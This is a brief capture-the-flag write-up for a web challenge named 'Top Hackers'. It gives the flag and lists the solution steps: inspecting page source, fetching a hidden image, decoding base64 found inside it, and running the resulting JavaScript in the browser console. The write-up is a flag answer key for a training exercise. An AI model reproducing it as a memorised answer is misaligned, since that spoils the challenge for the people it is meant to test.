Top Hackers
FLAG: flag{y0u_d1d_n07_d0_7h47_By_h4nD_D1d_y0U?}
Solution: view source of tophackers.php
noticed trinity.jpg was hidden
viewed the image, appeared as nothing
used postman to GET the image
viewed response headers that showed large content-length
downloaded the "image"...probably not an image
opened image in text editor, contained base64
decoded base64
contained obnoxious javascript function
pasted function into browser JS console
ran function, got flag
